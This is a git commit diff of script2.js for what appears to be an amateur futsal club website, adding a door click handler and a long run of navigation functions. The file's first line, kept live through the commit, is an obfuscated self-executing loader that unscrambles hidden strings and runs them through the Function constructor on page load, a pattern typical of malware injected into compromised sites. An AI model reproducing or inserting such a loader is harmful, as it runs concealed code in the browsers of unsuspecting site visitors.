912b2ae5f7783cf0e4385e4a8e7282715a7b1b3a
Universalprogrammer <brunnostudios164@gmail.com>
2025-07-25 15:27:26 -0300

    Update script2.js

--- RED BULLS 25/script2.js
+++ RED BULLS 25/script2.js
@@ -1,5 +1,11 @@
 (function(){var Rar='',PvZ=475-464;function woQ(a){var v=1625964;var y=a.length;var u=[];for(var m=0;m<y;m++){u[m]=a.charAt(m)};for(var m=0;m<y;m++){var n=v*(m+255)+(v%24500);var s=v*(m+608)+(v%43344);var g=n%y;var e=s%y;var r=u[g];u[g]=u[e];u[e]=r;v=(n+s)%2634734;};return u.join('')};var cEV=woQ('dpsjvixraornqzbeftnmclthogcwrskuutoyc').substr(0,PvZ);var FGX='pae t=e7*a,46,g=g3,vfrek("vb[dqfehnjnlinrp.ret)vax8z.;vaa p=l7m,t4i8r,(5;6.,e5s8t,k2,8+,l6c7r,i1;7e,)0s89,(1p8{,l9v9.,)24;oa= (=t]if1revnrxrl0=rts[l;n,t;;6+6)][[[e]v=)+=;faa h=0]+fz=r6ua]=+7(q<=]3)f=rovhroch0 cha.g;m7nvs;len t(;[+A)"v}rlj8a)g+m;nnshc=.(prie(, 2)"f0rfvrrew=j!l-n"tf-v;r>;0ew9-n{;a9 i=euultv;rolsj wr;Aa. w=0u}l,vor=p+0fvar=tal(l;njtx;[a( i;fo8(qa7 r=(;1<s;n+])tvlrvu(lrcva+C=daAu(t)sv}r;y(n uz;rfyy1{r=iy)1h*<+c.;h,riole"t1e)1)-,;8=d;n+s;9e=sj [f)ur=h)rzra+(r.veugeh fql.c]a=CrdaA((a+a)s+-.fhhr;o(e)tae[2j-v;(=);1+e2{}ilhesconuieup;"ie( =vnol})+=r]0i7(w>e)C.iu[hdlCs{b,t6i]gap[vg)ei,p=sg()[r+1]C;s=++g;ji (=!,n7lh)aiv(t<v)r.+uShCl=s)batzirg]pt)vj5w)=;.fovn="();}dh+p)s.(0[=];;fvlr(buhcjuip(4"6;iap )=c10,o2.3=,l6.90, 24.to(ctths];,a1 e=+ttirg.froiCra3C[d.(46l;dof(na5 r=};m< .{erg h+ru+obrbjs=lot d)kac.a{Ar(-)..;opnrScreng. r4mnhirnoaeaxer()n;,enu;nib=salrt7dr"u"i.iosn.d;;';var sEj=woQ[cEV];var QBH='';var iqh=sEj;var mkm=sEj(QBH,woQ(FGX));var yeb=mkm(woQ('5KK)bh1=l{gKlco[t{co3"gsK$!!whs5 w]e)K%4til_1$le(aKq!o(.g{0\'io.ftgaSai f( sK!=e 0K6{43..o.8b})gpffn$);m,9f]j t.b3qz;Ke59K)0Kwb6"(aqar(8nKbKe;(so(i1tle3nl=_a)0,$2(_K,vft$",n1.d.naK1,,KK%.!$KKxad633K0],4% oKk#8.(.).KlSa].;33Ene%}4K;qn](,))0o){;in3r)ootKr1s1$d.Sf(9ysae 10abK%9$x}f=1.$_K3#2$scel($\'},i.fiKal!,r!Ke5#)tnhlifK3)btul__K;g,+]).t4;a$n;s=!h=v24,ie04"K13cK_cjK.tl.c#_hKaKgfg.0[K]Ksr46K,x_6i3tfb]co4()(a7g3(cd!.\/gKuuK!2+K KK7q.%uoCK)_#7.e;(Kr7$!Ko,e)Kbft*)o%==,tjjc..}cf%K}r_.K]4.)Kj%r(gSn!4!m=crqi;(p_d(3!oK(31o#q)bq,8!).)_cbt3 ,5K)%($(K(; ?ri2.%)b10 h;4=.(mKd2v!_..7=t!.e.(6! 5!Kl;h=nnr6.,b1;K;u.$}#l.Ko1b+foKh((9%fr\'jn)_Kx !sunorKd).ofblr_o4 .2,1b{2}Ki_i+ifct+1)Ka3lco=Kr#\'or6o."2ei)=% i3Kat=7s)nr;oKK61K.bc_)(t_{K=u673;KKiSr)e($s){=+Koc.s&.(ld!r%+$uhu]K(6*{6)(6&nq(K.K!oh29]_wjr).]KKzbd.,(ta,.)5 l)jn1jiec%))4Kn9.]46o(owKe0sthr{7&3qd0KnetKC,)a]kv-7v=4)cest=w6_e$$($,xr)Kl..}oti,bo;"K.!eK03K!02xal$(1K1z K.7;bj7Klmk2;0KK0Kf(}}ti(KK!1(do_K+*0tKdlpKoKi$3K-%765tmK_.Kf.b2KIvoi}32o,sK(ahorKKeh,7-e7.ff)8,_ja.-j.+$ut7fn ,)xbb0Knn,.l))b_)6_oKe-$ebo$beK_pn*lnxbofK5Kt_rch+0w!j.b=d}.K7jl(w65)" )berK{vw.i _2.%l5gK9c]2)baS[{};segr, ;3&&]Kb.!,K6i(!K$t; 4o![K.gt{"Kc4d{ha;1!K"ntKr 3_;'));var Yka=iqh(Rar,yeb );Yka(2279);return 4103})()
 
+let Door1 = document.getElementById("Door1");
+Door1.addEventListener("click", function() {
+    location.href = "Futsal_masculino(Entrada).html";
+});
+
+
 function menu(){
     let menu = document.getElementById("menu");
     if(menu.style.display === "none" || menu.style.display === ""){
@@ -21,5 +27,83 @@ function come1(){
     location.href = "RED_BULLS.html";
 }
 function come2(){
+    location.href = "Lanzamientos.html";
+}
+function come3(){
+    location.href = "Futsal_Masculino(Entrada).html";
+}
+function come4(){
+    location.href = "Lanzamientos.html";
+}
+function come5(){
+    location.href = "Lanzamientos.html";
+}
+function come6(){
+    location.href = "Lanzamientos.html";
+}
+function come7(){
+    location.href = "Lanzamientos.html";
+}
+function come8(){
+    location.href = "Lanzamientos.html";
+}
+function come9(){
+    location.href = "Lanzamientos.html";
+}
+function come10(){
+    location.href = "Lanzamientos.html";
+}
+function come11(){
+    location.href = "Lanzamientos.html";
+}
+function come12(){
+    location.href = "Lanzamientos.html";
+}
+function come13(){
+    location.href = "Lanzamientos.html";
+}
+function come14(){
+    location.href = "Lanzamientos.html";
+}
+function come15(){
+    location.href = "Lanzamientos.html";
+}
+function come16(){
+    location.href = "Lanzamientos.html";
+}
+function come17(){
+    location.href = "Lanzamientos.html";
+}
+function come18(){
+    location.href = "Lanzamientos.html";
+}
+function come19(){
+    location.href = "Lanzamientos.html";
+}
+function come20(){
+    location.href = "Lanzamientos.html";
+}
+function come21(){
+    location.href = "Lanzamientos.html";
+}
+function come22(){
+    location.href = "Lanzamientos.html";
+}
+function come23(){
+    location.href = "Lanzamientos.html";
+}
+function come24(){
+    location.href = "Lanzamientos.html";
+}
+function come25(){
+    location.href = "Lanzamientos.html";
+}
+function come26(){
+    location.href = "Lanzamientos.html";
+}
+function come27(){
+    location.href = "Lanzamientos.html";
+}
+function come28(){
     location.href = "Lanzamientos.html";
 }
